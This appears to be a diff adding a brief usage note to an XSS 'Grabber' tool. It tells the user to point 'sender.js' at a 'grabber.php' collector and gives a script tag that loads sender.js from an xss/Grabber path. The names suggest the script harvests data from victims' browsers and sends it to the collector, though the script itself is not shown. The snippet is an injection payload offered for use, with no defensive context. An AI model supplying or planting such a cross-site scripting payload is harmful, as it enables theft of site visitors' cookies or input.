@@ -1,0 +1,3 @@
+change address of "grabber.php" into "sender.js" file so use from this code:
+
+	<script src="http://localhost/xss/Grabber/sender.js"></script>
